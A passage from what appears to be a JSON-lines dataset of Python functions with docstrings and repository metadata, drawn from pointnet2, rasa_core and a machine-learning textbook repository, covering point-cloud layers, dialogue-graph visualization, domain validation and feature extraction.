tf.variable_scope('weighted_avg'):\n            dists = tf.norm(grouped_xyz,axis=-1,ord=2,keep_dims=True)\n            exp_dists = tf.exp(-dists * 5)\n            weights = exp_dists/tf.reduce_sum(exp_dists,axis=2,keep_dims=True) # (batch_size, npoint, nsample, 1)\n            new_points *= weights # (batch_size, npoint, nsample, mlp[-1])\n            new_points = tf.reduce_sum(new_points, axis=2, keep_dims=True)\n    elif pooling=='max_and_avg':\n        max_points = tf.reduce_max(new_points, axis=[2], keep_dims=True, name='maxpool')\n        avg_points = tf.reduce_mean(new_points, axis=[2], keep_dims=True, name='avgpool')\n        new_points = tf.concat([avg_points, max_points], axis=-1)\n\n    # [Optional] Further Processing \n    if mlp2 is not None:\n        if use_nchw: new_points = tf.transpose(new_points, [0,3,1,2])\n        for i, num_out_channel in enumerate(mlp2):\n            new_points = tf_util.conv2d(new_points, num_out_channel, [1,1],\n                                        padding='VALID', stride=[1,1],\n                                        bn=bn, is_training=is_training,\n                                        scope='conv_post_%d'%(i), bn_decay=bn_decay,\n                                        data_format=data_format) \n        if use_nchw: new_points = tf.transpose(new_points, [0,2,3,1])\n\n    new_points = tf.squeeze(new_points, [2]) # (batch_size, npoints, mlp2[-1])\n    return new_xyz, new_points, idx", "path": "pointnet2/utils/pointnet_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "# TODO: add backend thread to load data\n", "func_signal": "def has_next_batch(self):\n", "code": "if (self.current_data is None) or (not self._has_next_batch_in_file()):\n    if self.current_file_idx >= len(self.h5_files):\n        return False\n    self._load_data_file(self._get_data_filename())\n    self.batch_idx = 0\n    self.current_file_idx += 1\nreturn self._has_next_batch_in_file()", "path": "pointnet2/modelnet_h5_dataset.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' pc: BxNx3 array, return BxN pred '''\n", "func_signal": "def inference(sess, ops, pc, batch_size):\n", "code": "assert pc.shape[0]%batch_size == 0\nnum_batches = pc.shape[0]/batch_size\nlogits = np.zeros((pc.shape[0], pc.shape[1], NUM_CLASSES))\nfor i in range(num_batches):\n    feed_dict = {ops['pointclouds_pl']: pc[i*batch_size:(i+1)*batch_size,...],\n                 ops['is_training_pl']: False}\n    batch_logits = sess.run(ops['pred'], feed_dict=feed_dict)\n    logits[i*batch_size:(i+1)*batch_size,...] = batch_logits\nreturn np.argmax(logits, 2)", "path": "pointnet2/part_seg/test.py", "commit_date": "2018-01-12 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "''' PointNet Set Abstraction (SA) module with Multi-Scale Grouping (MSG)\n    Input:\n        xyz: (batch_size, ndataset, 3) TF tensor\n        points: (batch_size, ndataset, channel) TF tensor\n        npoint: int32 -- #points sampled in farthest point sampling\n        radius: list of float32 -- search radius in local region\n        nsample: list of int32 -- how many points in each local region\n        mlp: list of list of int32 -- output size for MLP on each point\n        use_xyz: bool, if True concat XYZ with local point features, otherwise just use point features\n        use_nchw: bool, if True, use NCHW data format for conv2d, which is usually faster than NHWC format\n    Return:\n        new_xyz: (batch_size, npoint, 3) TF tensor\n        new_points: (batch_size, npoint, \\sum_k{mlp[k][-1]}) TF tensor\n'''\n", "func_signal": "def pointnet_sa_module_msg(xyz, points, npoint, radius_list, nsample_list, mlp_list, is_training, bn_decay, scope, bn=True, use_xyz=True, use_nchw=False):\n", "code": "data_format = 'NCHW' if use_nchw else 'NHWC'\nwith tf.variable_scope(scope) as sc:\n    new_xyz = gather_point(xyz, farthest_point_sample(npoint, xyz))\n    new_points_list = []\n    for i in range(len(radius_list)):\n        radius = radius_list[i]\n        nsample = nsample_list[i]\n        idx, pts_cnt = query_ball_point(radius, nsample, xyz, new_xyz)\n        grouped_xyz = group_point(xyz, idx)\n        grouped_xyz -= tf.tile(tf.expand_dims(new_xyz, 2), [1,1,nsample,1])\n        if points is not None:\n            grouped_points = group_point(points, idx)\n            if use_xyz:\n                grouped_points = tf.concat([grouped_points, grouped_xyz], axis=-1)\n        else:\n            grouped_points = grouped_xyz\n        if use_nchw: grouped_points = tf.transpose(grouped_points, [0,3,1,2])\n        for j,num_out_channel in enumerate(mlp_list[i]):\n            grouped_points = tf_util.conv2d(grouped_points, num_out_channel, [1,1],\n                                            padding='VALID', stride=[1,1], bn=bn, is_training=is_training,\n                                            scope='conv%d_%d'%(i,j), bn_decay=bn_decay)\n        if use_nchw: grouped_points = tf.transpose(grouped_points, [0,2,3,1])\n        new_points = tf.reduce_max(grouped_points, axis=[2])\n        new_points_list.append(new_points)\n    new_points_concat = tf.concat(new_points_list, axis=-1)\n    return new_xyz, new_points_concat", "path": "pointnet2/utils/pointnet_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\" Batch normalization on convolutional maps and beyond...\nRef.: http://stackoverflow.com/questions/33949786/how-could-i-use-batch-normalization-in-tensorflow\n\nArgs:\n    inputs:        Tensor, k-D input ... x C could be BC or BHWC or BDHWC\n    is_training:   boolean tf.Varialbe, true indicates training phase\n    scope:         string, variable scope\n    moments_dims:  a list of ints, indicating dimensions for moments calculation\n    bn_decay:      float or float tensor variable, controling moving average weight\n    data_format:   'NHWC' or 'NCHW'\nReturn:\n    normed:        batch-normalized maps\n\"\"\"\n", "func_signal": "def batch_norm_template(inputs, is_training, scope, moments_dims_unused, bn_decay, data_format='NHWC'):\n", "code": "bn_decay = bn_decay if bn_decay is not None else 0.9\nreturn tf.contrib.layers.batch_norm(inputs, \n                                    center=True, scale=True,\n                                    is_training=is_training, decay=bn_decay,updates_collections=None,\n                                    scope=scope,\n                                    data_format=data_format)", "path": "pointnet2/utils/tf_util.py", "commit_date": "2018-02-26 00:00:00", "repo_name": "charlesq34/pointnet2", "stars": 2890, "license": "other", "language": "python", "size": 650}
{"docstring": "\"\"\"Searches for equivalent nodes in the graph and merges them.\"\"\"\n\n", "func_signal": "def _merge_equivalent_nodes(graph, max_history):\n", "code": "changed = True\n# every node merge changes the graph and can trigger previously\n# impossible node merges - we need to repeat until\n# the graph doesn't change anymore\nwhile changed:\n    changed = False\n    remaining_node_ids = [n for n in graph.nodes() if n > 0]\n    for idx, i in enumerate(remaining_node_ids):\n        if graph.has_node(i):\n            # assumes node equivalence is cumulative\n            for j in remaining_node_ids[idx + 1:]:\n                if (graph.has_node(j) and\n                        _nodes_are_equivalent(graph, i, j, max_history)):\n                    # make sure we keep special styles\n                    _transfer_style(graph.nodes(data=True)[j],\n                                    graph.nodes(data=True)[i])\n\n                    changed = True\n                    # moves all outgoing edges to the other node\n                    j_outgoing_edges = list(graph.out_edges(j, keys=True,\n                                                            data=True))\n                    for _, succ_node, k, d in j_outgoing_edges:\n                        _add_edge(graph, i, succ_node, k, d.get(\"label\"),\n                                  **{\"class\": d.get(\"class\", \"\")})\n                        graph.remove_edge(j, succ_node)\n                    # moves all incoming edges to the other node\n                    j_incoming_edges = list(graph.in_edges(j, keys=True,\n                                                           data=True))\n                    for prev_node, _, k, d in j_incoming_edges:\n                        _add_edge(graph, prev_node, i, k, d.get(\"label\"),\n                                  **{\"class\": d.get(\"class\", \"\")})\n                        graph.remove_edge(prev_node, j)\n                    graph.remove_node(j)", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Plots the graph and persists it into a html file.\"\"\"\n", "func_signal": "def persist_graph(graph, output_file):\n", "code": "import networkx as nx\n\nexpg = nx.nx_pydot.to_pydot(graph)\n\nwith open(visualization_html_path(), 'r') as file:\n    template = file.read()\n\n# customize content of template by replacing tags\ntemplate = template.replace('// { is-client }', 'isClient = true', 1)\ntemplate = template.replace('// { graph-content }', \"graph = `{}`\"\n                            .format(expg.to_string()), 1)\n\nwith open(output_file, 'w') as file:\n    file.write(template)", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# noinspection PyProtectedMember\n", "func_signal": "def test_tf_config(self, trained_policy, tmpdir):\n", "code": "assert trained_policy.session._config == session_config()\ntrained_policy.persist(tmpdir.strpath)\nloaded = trained_policy.__class__.load(tmpdir.strpath)\n# noinspection PyProtectedMember\nassert loaded.session._config == session_config()", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# use standard featurizer from EmbeddingPolicy,\n# since it is using FullDialogueTrackerFeaturizer\n", "func_signal": "def create_policy(self, featurizer, priority):\n", "code": "p = EmbeddingPolicy(priority=priority, **tf_defaults())\nreturn p", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# use standard featurizer from EmbeddingPolicy,\n# since it is using FullDialogueTrackerFeaturizer\n", "func_signal": "def create_policy(self, featurizer, priority):\n", "code": "p = EmbeddingPolicy(priority=priority, attn_before_rnn=True,\n                    attn_after_rnn=False)\nreturn p", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"\nArgs:\n    action_name: name of the scheduled action to be cancelled\n\"\"\"\n\n", "func_signal": "def __init__(self, action_name, timestamp=None):\n", "code": "self.action_name = action_name\nsuper(ReminderCancelled, self).__init__(timestamp)", "path": "rasa_core/rasa/core/events/__init__.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Called to convert a parsed story line into an event.\"\"\"\n", "func_signal": "def _from_story_string(cls, parameters):\n", "code": "return [Form(parameters.get(\"name\"),\n             parameters.get(\"timestamp\"))]", "path": "rasa_core/rasa/core/events/__init__.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"If the outgoing edges from the two nodes are similar enough,\nit doesn't matter if you are in a or b.\n\nAs your path will be the same because the outgoing edges will lead you to\nthe same nodes anyways.\"\"\"\n\n", "func_signal": "def _outgoing_edges_are_similar(graph, node_a, node_b):\n", "code": "ignored = {node_b, node_a}\na_edges = {(target, k) for target, k in _outgoing_edges(graph, node_a) if\n           target not in ignored}\nb_edges = {(target, k) for target, k in _outgoing_edges(graph, node_b) if\n           target not in ignored}\nreturn a_edges == b_edges or not a_edges or not b_edges", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Find a data sample with the same intent and entities.\n\nGiven the parsed data from a message (intent and entities) finds a\nmessage in the data that has the same intent and entities.\"\"\"\n\n", "func_signal": "def message_for_data(self, structured_info):\n", "code": "if structured_info.get(\"intent\") is not None:\n    intent_name = structured_info.get(\"intent\", {}).get(\"name\")\n    usable_examples = self.mapping.get(intent_name, [])[:]\n    random.shuffle(usable_examples)\n    for example in usable_examples:\n        entities = {e.get(\"entity\"): e.get(\"value\")\n                    for e in example.get(\"entities\", [])}\n        for e in structured_info.get(\"entities\", []):\n            if self._contains_same_entity(entities, e):\n                break\n        else:\n            return example.text\nreturn structured_info.get(\"text\")", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# use standard featurizer from EmbeddingPolicy,\n# since it is using FullDialogueTrackerFeaturizer\n", "func_signal": "def create_policy(self, featurizer, priority):\n", "code": "p = EmbeddingPolicy(priority=priority, attn_before_rnn=False,\n                    attn_after_rnn=True)\nreturn p", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Copy over class names from source to target for all special classes.\n\nUsed if a node is highlighted and merged with another node.\"\"\"\n\n", "func_signal": "def _transfer_style(source, target):\n", "code": "clazzes = source.get(\"class\", \"\")\n\nspecial_classes = {\"dashed\", \"active\"}\n\nif \"class\" not in target:\n    target[\"class\"] = \"\"\n\nfor c in special_classes:\n    if c in clazzes and c not in target[\"class\"]:\n        target[\"class\"] += \" \" + c\n\ntarget[\"class\"] = target[\"class\"].strip()\nreturn target", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Make sure the domain is properly configured.\n\nChecks the settings and checks if there are duplicate actions,\nintents, slots and entities.\"\"\"\n\n", "func_signal": "def check_domain_sanity(domain):\n", "code": "def get_duplicates(my_items):\n    \"\"\"Returns a list of duplicate items in my_items.\"\"\"\n\n    return [item\n            for item, count in collections.Counter(my_items).items()\n            if count > 1]\n\ndef check_mappings(intent_properties):\n    \"\"\"Check whether intent-action mappings use proper action names.\"\"\"\n\n    incorrect = list()\n    for intent, properties in intent_properties.items():\n        if 'triggers' in properties:\n            if properties.get('triggers') not in domain.action_names:\n                incorrect.append((intent, properties['triggers']))\n    return incorrect\n\ndef get_exception_message(\n        duplicates: Optional[List[Tuple[List[Text], Text]]] = None,\n        mappings: List[Tuple[Text, Text]] = None):\n    \"\"\"Return a message given a list of error locations.\"\"\"\n\n    message = \"\"\n    if duplicates:\n        message += get_duplicate_exception_message(duplicates)\n    if mappings:\n        if message:\n            message += \"\\n\"\n        message += get_mapping_exception_message(mappings)\n    return message\n\ndef get_mapping_exception_message(mappings: List[Tuple[Text, Text]]):\n    \"\"\"Return a message given a list of duplicates.\"\"\"\n\n    message = \"\"\n    for name, action_name in mappings:\n        if message:\n            message += \"\\n\"\n        message += (\"Intent '{}' is set to trigger action '{}', which is \"\n                    \"not defined in the domain.\".format(name, action_name))\n    return message\n\ndef get_duplicate_exception_message(\n    duplicates: List[Tuple[List[Text], Text]]\n) -> Text:\n    \"\"\"Return a message given a list of duplicates.\"\"\"\n\n    message = \"\"\n    for d, name in duplicates:\n        if d:\n            if message:\n                message += \"\\n\"\n            message += (\"Duplicate {0} in domain. \"\n                        \"These {0} occur more than once in \"\n                        \"the domain: {1}\".format(name, \", \".join(d)))\n    return message\n\nduplicate_actions = get_duplicates(domain.action_names)\nduplicate_intents = get_duplicates(domain.intents)\nduplicate_slots = get_duplicates([s.name for s in domain.slots])\nduplicate_entities = get_duplicates(domain.entities)\nincorrect_mappings = check_mappings(domain.intent_properties)\n\nif (duplicate_actions or duplicate_intents or duplicate_slots or\n        duplicate_entities or incorrect_mappings):\n    raise InvalidDomain(get_exception_message([\n        (duplicate_actions, \"actions\"),\n        (duplicate_intents, \"intents\"),\n        (duplicate_slots, \"slots\"),\n        (duplicate_entities, \"entities\")], incorrect_mappings))", "path": "rasa_core/rasa/core/domain.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# use standard featurizer from EmbeddingPolicy,\n# since it is using FullDialogueTrackerFeaturizer\n", "func_signal": "def create_policy(self, featurizer, priority):\n", "code": "p = EmbeddingPolicy(priority=priority, attn_before_rnn=True,\n                    attn_after_rnn=True)\nreturn p", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# type: () -> Dict[Text, Any]\n\n", "func_signal": "def as_dict(self):\n", "code": "additional_config = {\n    \"store_entities_as_slots\": self.store_entities_as_slots}\n\nreturn {\n    \"config\": additional_config,\n    \"intents\": [{k: v} for k, v in self.intent_properties.items()],\n    \"entities\": self.entities,\n    \"slots\": self._slot_definitions(),\n    \"templates\": self.templates,\n    \"actions\": self.user_actions,  # class names of the actions\n    \"forms\": self.form_names\n}", "path": "rasa_core/rasa/core/domain.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# noinspection PyProtectedMember\n", "func_signal": "def test_tf_config(self, trained_policy, tmpdir):\n", "code": "assert trained_policy.session._config == session_config()\ntrained_policy.persist(tmpdir.strpath)\nloaded = trained_policy.__class__.load(tmpdir.strpath)\n# noinspection PyProtectedMember\nassert loaded.session._config == session_config()", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "# use standard featurizer from EmbeddingPolicy,\n# since it is using FullDialogueTrackerFeaturizer\n", "func_signal": "def create_policy(self, featurizer, priority):\n", "code": "p = EmbeddingPolicy(priority=priority, attn_before_rnn=False,\n                    attn_after_rnn=False)\nreturn p", "path": "rasa_core/tests/core/test_policies.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Adds an edge to the graph if the edge is not already present. Uses the\nlabel as the key.\"\"\"\n\n", "func_signal": "def _add_edge(graph, u, v, key, label=None, **kwargs):\n", "code": "if key is None:\n    key = EDGE_NONE_LABEL\n\nif key == EDGE_NONE_LABEL:\n    label = \"\"\n\nif not graph.has_edge(u, v, key=EDGE_NONE_LABEL):\n    graph.add_edge(u, v, key=key, label=label, **kwargs)\nelse:\n    d = graph.get_edge_data(u, v, key=EDGE_NONE_LABEL)\n    _transfer_style(kwargs, d)", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Validate domain yaml.\"\"\"\n", "func_signal": "def validate_domain_yaml(cls, yaml):\n", "code": "from pykwalify.core import Core\n\nlog = logging.getLogger('pykwalify')\nlog.setLevel(logging.WARN)\n\nschema_file = pkg_resources.resource_filename(__name__,\n                                              \"schemas/domain.yml\")\nsource_data = utils.read_yaml_string(yaml)\nc = Core(source_data=source_data,\n         schema_files=[schema_file])\ntry:\n    c.validate(raise_exception=True)\nexcept SchemaError:\n    raise InvalidDomain(\"Failed to validate your domain yaml. \"\n                        \"Make sure the file is correct, to do so\"\n                        \"take a look at the errors logged during \"\n                        \"validation previous to this exception. \")", "path": "rasa_core/rasa/core/domain.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Called to convert a dictionary of parameters to a single event.\n\nBy default uses the same implementation as the story line\nconversation ``_from_story_string``. But the subclass might\ndecide to handle parameters differently if the parsed parameters\ndon't origin from a story file.\"\"\"\n\n", "func_signal": "def _from_parameters(cls, parameters):\n", "code": "result = cls._from_story_string(parameters)\nif len(result) > 1:\n    logger.warning(\"Event from parameters called with parameters \"\n                   \"for multiple events. This is not supported, \"\n                   \"only the first event will be returned. \"\n                   \"Parameters: {}\".format(parameters))\nreturn result[0] if result else None", "path": "rasa_core/rasa/core/events/__init__.py", "commit_date": "2019-03-20 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "\"\"\"Decides if two nodes are equivalent based on their fingerprints.\"\"\"\n", "func_signal": "def _nodes_are_equivalent(graph, node_a, node_b, max_history):\n", "code": "return (graph.node[node_a][\"label\"] == graph.node[node_b][\"label\"] and\n        (_outgoing_edges_are_similar(graph, node_a, node_b) or\n         _incoming_edges(graph, node_a) == _incoming_edges(graph, node_b) or\n         _fingerprint_node(graph, node_a, max_history) ==\n         _fingerprint_node(graph, node_b, max_history)))", "path": "rasa_core/rasa/core/training/visualization.py", "commit_date": "2019-04-03 00:00:00", "repo_name": "RasaHQ/rasa_core", "stars": 2330, "license": "apache-2.0", "language": "python", "size": 1059972}
{"docstring": "'''Compute features for an image\n\nParameters\n----------\nim : ndarray\n\nReturns\n-------\nfs : ndarray\n    1-D array of features\n'''\n", "func_signal": "def texture(im):\n", "code": "im = im.astype(np.uint8)\nreturn mh.features.haralick(im).ravel()", "path": "BuildingMachineLearningSystemsWithPython/ch10/features.py", "commit_date": "2015-03-20 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "# create it again for plotting\n", "func_signal": "def train_model(clf, X, Y, name=\"NB ngram\", plot=False):\n", "code": "cv = ShuffleSplit(\n    n=len(X), n_iter=10, test_size=0.3, random_state=0)\n\ntrain_errors = []\ntest_errors = []\n\nscores = []\npr_scores = []\nprecisions, recalls, thresholds = [], [], []\n\nclfs = []  # just to later get the median\n\nfor train, test in cv:\n    X_train, y_train = X[train], Y[train]\n    X_test, y_test = X[test], Y[test]\n\n    clf.fit(X_train, y_train)\n    clfs.append(clf)\n\n    train_score = clf.score(X_train, y_train)\n    test_score = clf.score(X_test, y_test)\n\n    train_errors.append(1 - train_score)\n    test_errors.append(1 - test_score)\n\n    scores.append(test_score)\n    proba = clf.predict_proba(X_test)\n\n    fpr, tpr, roc_thresholds = roc_curve(y_test, proba[:, 1])\n    precision, recall, pr_thresholds = precision_recall_curve(\n        y_test, proba[:, 1])\n\n    pr_scores.append(auc(recall, precision))\n    precisions.append(precision)\n    recalls.append(recall)\n    thresholds.append(pr_thresholds)\n\nif plot:\n    scores_to_sort = pr_scores\n    median = np.argsort(scores_to_sort)[len(scores_to_sort) / 2]\n\n    plot_pr(pr_scores[median], name, phase, precisions[median],\n            recalls[median], label=name)\n\n    log_false_positives(clfs[median], X_test, y_test, name)\n\nsummary = (np.mean(scores), np.std(scores),\n           np.mean(pr_scores), np.std(pr_scores))\nprint(\"%.3f\\t%.3f\\t%.3f\\t%.3f\\t\" % summary)\n\nreturn np.mean(train_errors), np.mean(test_errors)", "path": "BuildingMachineLearningSystemsWithPython/ch06/03_clean.py", "commit_date": "2015-03-25 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''\ndata,labels = load_dataset(dataset_name)\n\nLoad a given dataset\n\nReturns\n-------\ndata : numpy ndarray\nlabels : list of str\n'''\n", "func_signal": "def load_dataset(dataset_name):\n", "code": "data = []\nlabels = []\nwith open('./data/{0}.tsv'.format(dataset_name)) as ifile:\n    for line in ifile:\n        tokens = line.strip().split('\\t')\n        data.append([float(tk) for tk in tokens[:-1]])\n        labels.append(tokens[-1])\ndata = np.array(data)\nlabels = np.array(labels)\nreturn data, labels", "path": "BuildingMachineLearningSystemsWithPython/ch02/load.py", "commit_date": "2013-10-29 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Compute color histogram of input image\n\nParameters\n----------\nim : ndarray\n    should be an RGB image\n\nReturns\n-------\nc : ndarray\n    1-D array of histogram values\n'''\n\n# Downsample pixel values:\n", "func_signal": "def chist(im):\n", "code": "im = im // 64\n\n# We can also implement the following by using np.histogramdd\n# im = im.reshape((-1,3))\n# bins = [np.arange(5), np.arange(5), np.arange(5)]\n# hist = np.histogramdd(im, bins=bins)[0]\n# hist = hist.ravel()\n\n# Separate RGB channels:\nr,g,b = im.transpose((2,0,1))\n\npixels = 1 * r + 4 * g + 16 * b\nhist = np.bincount(pixels.ravel(), minlength=64)\nhist = hist.astype(float)\nreturn np.log1p(hist)", "path": "BuildingMachineLearningSystemsWithPython/ch10/features.py", "commit_date": "2015-03-20 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Iterate over all (image,label) pairs\n\nThis function will return\n'''\n", "func_signal": "def images():\n", "code": "for ci, cl in enumerate(classes):\n    images = glob('{}/{}/*.jpg'.format(basedir, cl))\n    for im in sorted(images):\n        yield im, ci", "path": "BuildingMachineLearningSystemsWithPython/ch10/large_classification.py", "commit_date": "2015-04-20 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Learn the vocabulary dictionary and return the count vectors\n\nThis is more efficient than calling fit followed by transform.\n\nParameters\n----------\nraw_documents: iterable\n    an iterable which yields either str, unicode or file objects\n\nReturns\n-------\nvectors: array, [n_samples, n_features]\n\"\"\"\n", "func_signal": "def fit_transform(self, raw_documents, y=None):\n", "code": "if self.fixed_vocabulary:\n    # No need to fit anything, directly perform the transformation.\n    # We intentionally don't call the transform method to make it\n    # fit_transform overridable without unwanted side effects in\n    # TfidfVectorizer\n    analyze = self.build_analyzer()\n    term_counts_per_doc = [PosCounter(analyze(doc), normalize=self.normalize, poscache=self.poscache)\n                           for doc in raw_documents]\n    return self._term_count_dicts_to_matrix(term_counts_per_doc)\n\nself.vocabulary_ = {}\n# result of document conversion to term count dicts\nterm_counts_per_doc = []\nterm_counts = Counter()\n\nanalyze = self.build_analyzer()\n\nfor doc in raw_documents:\n    term_count_current = PosCounter(\n        analyze(doc), normalize=self.normalize, poscache=self.poscache)\n    term_counts.update(term_count_current)\n\n    term_counts_per_doc.append(term_count_current)\n\nself.write_poscache()\n\nterms = set(term_counts)\n\n# store map from term name to feature integer index: we sort the term\n# to have reproducible outcome for the vocabulary structure: otherwise\n# the mapping from feature name to indices might depend on the memory\n# layout of the machine. Furthermore sorted terms might make it\n# possible to perform binary search in the feature names array.\nself.vocabulary_ = dict(((t, i) for i, t in enumerate(sorted(terms))))\n\nreturn self._term_count_dicts_to_matrix(term_counts_per_doc)", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "'''Apply a learned model'''\n# A model is a pair as returned by fit_model\n", "func_signal": "def predict(model, features):\n", "code": "t, fi, reverse = model\nif reverse:\n    return features[:, fi] <= t\nelse:\n    return features[:, fi] > t", "path": "BuildingMachineLearningSystemsWithPython/ch02/threshold.py", "commit_date": "2015-01-26 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Learn a vocabulary dictionary of all tokens in the raw documents\n\nParameters\n----------\nraw_documents: iterable\n    an iterable which yields either str, unicode or file objects\n\nReturns\n-------\nself\n\"\"\"\n", "func_signal": "def fit(self, raw_documents, y=None):\n", "code": "self.fit_transform(raw_documents)\nreturn self", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
{"docstring": "\"\"\"Return a function to preprocess the text before tokenization\"\"\"\n\n# unfortunately python functools package does not have an efficient\n# `compose` function that would have allowed us to chain a dynamic\n# number of functions. However the however of a lambda call is a few\n# hundreds of nanoseconds which is negligible when compared to the\n# cost of tokenizing a string of 1000 chars for instance.\n", "func_signal": "def build_preprocessor(self):\n", "code": "noop = lambda x: x\n\n# accent stripping\nif not self.strip_accents:\n    strip_accents = noop\nelif hasattr(self.strip_accents, '__call__'):\n    strip_accents = self.strip_accents\nelif self.strip_accents == 'ascii':\n    strip_accents = strip_accents_ascii\nelif self.strip_accents == 'unicode':\n    strip_accents = strip_accents_unicode\nelse:\n    raise ValueError('Invalid value for \"strip_accents\": %s' %\n                     self.strip_accents)\n\nonly_prose = lambda s: re.sub('<[^>]*>', '', s).replace(\"\\n\", \" \")\n\nreturn lambda x: strip_accents(only_prose(x))", "path": "BuildingMachineLearningSystemsWithPython/ch05/PosTagFreqVectorizer.py", "commit_date": "2013-10-04 00:00:00", "repo_name": "luispedro/BuildingMachineLearningSystemsWithPython", "stars": 2113, "license": "mit", "language": "python", "size": 187727}
